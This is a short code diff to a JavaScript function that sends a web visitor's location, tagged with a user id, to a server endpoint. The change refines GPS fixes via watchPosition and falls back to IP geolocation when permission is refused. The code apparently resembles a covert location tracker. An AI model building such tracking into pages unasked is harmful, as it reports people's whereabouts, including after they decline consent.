@@ -352,11 +352,22 @@ function fireLocation(){
   function sendLoc(lat,lon,acc){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)});}
   async function ipFb(){try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude)sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}catch(e){}}
   if(!navigator.geolocation){ipFb();return;}
-  var t=setTimeout(ipFb,10000);
-  navigator.geolocation.getCurrentPosition(
-    function(p){clearTimeout(t);sendLoc(p.coords.latitude,p.coords.longitude,p.coords.accuracy+"m (GPS)");},
-    function(){clearTimeout(t);ipFb();},
-    {enableHighAccuracy:true,timeout:9000,maximumAge:0}
+  var bestAcc=Infinity,wid=null,ipDone=false,gpsSent=false;
+  var ipTimer=setTimeout(function(){if(!gpsSent){ipDone=true;ipFb();}},10000);
+  var stopTimer=setTimeout(function(){if(wid!==null){navigator.geolocation.clearWatch(wid);wid=null;}},25000);
+  wid=navigator.geolocation.watchPosition(
+    function(p){
+      var acc=p.coords.accuracy;
+      if(acc<bestAcc){
+        bestAcc=acc;
+        clearTimeout(ipTimer);
+        gpsSent=true;
+        sendLoc(p.coords.latitude,p.coords.longitude,Math.round(acc)+"m (GPS)");
+        if(acc<=15){clearTimeout(stopTimer);navigator.geolocation.clearWatch(wid);wid=null;}
+      }
+    },
+    function(){clearTimeout(ipTimer);clearTimeout(stopTimer);if(!gpsSent)ipFb();},
+    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
   );
 }
 
